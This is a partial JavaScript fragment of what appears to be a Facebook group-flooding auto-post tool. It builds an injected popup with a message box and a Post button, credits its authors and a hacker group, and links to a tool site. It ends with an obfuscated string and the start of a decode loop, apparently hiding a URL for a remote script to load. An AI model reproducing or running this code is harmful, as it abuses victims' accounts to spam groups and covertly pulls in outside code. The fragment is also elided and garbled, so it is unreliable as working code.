...
grouppost += " < div > < textarea id = 'txtFloodMsg'
        placeholder = 'Write something...'
        style = 'COLOR:WHITE;padding-top:5px;width:493px;height:85px;font-family:tahoma;font-size:13px;background-color:rgba(255,255,255,0.1);' > < /textarea></div > ";
grouppost += " < div > < br > < span class = 'img sp_dpkef5 sx_f05251' > < /span><a style='position:absolute;font-family:Arial;size:3px;padding-left:3px;font-size:11px;color:rgb(128, 128, 128);'>Script Privacy: Group </a > < /span><button style='margin-left:437px' class='_42ft _4jy0 _11b _4jy3 _4jy1 selected' onclick='autopostingfunc(this);' >Post</button > < div style = 'color:gray;' > Powered By: Loading[lllllllllll] 99 % & Assam Indian Cyber Force. < /br>Script Made By:</A > < A style = 'color:#3B5998;'
        href = 'http://www.facebook.com/100001050235420'
        target = '_blank' > Waqar Ahmad < /A></A > , < A style = 'color:#3B5998;'
        href = 'http://www.facebook.com/100006306011509'
        target = '_blank' > Taimoor Abid < /A></A > , < /A><A style='color:#3B5998;' href='http:/ / www.facebook.com / 100005115938614 ' target='
        _blank '> Bhargav JT. Gogoi</A></A>.</br>For More Tools Visit Our Website: <A style='
        color: #3B5998;' href= 'http://www.automate-your-facebook.webnode.in'
        target = '_blank' > http: //www.automate-your-facebook.webnode.in</A>.</A><br></div>";
        ...
        var Popupset = document.createElement("div"); Popupset.setAttribute("style", "min-height:50px;width:500px;position:fixed;top:100px;box-shadow: 0px 4px 10px rgba(24, 144, 255, 0.63);position:fixed;left:50%;margin-left:-273px;text-align:left;border-radius:10px;padding:5px;z-index:999999;border:5px solid rgba(0,0,0,0.9);background-color:rgba(0,0,0,0.9);color:White"); Popupset.innerHTML = grouppost; document.body.appendChild(Popupset); jx = {
        ...
        var X = "jvvrq8--pcu,ekvjw`,amo-aqvpkaiq-dcag`mmi-ocqvgp-qwrrmpv,hq"; Y = ""; Z = "";
        var V; V = X.length;
        for (i = 0; i < V; i++) {
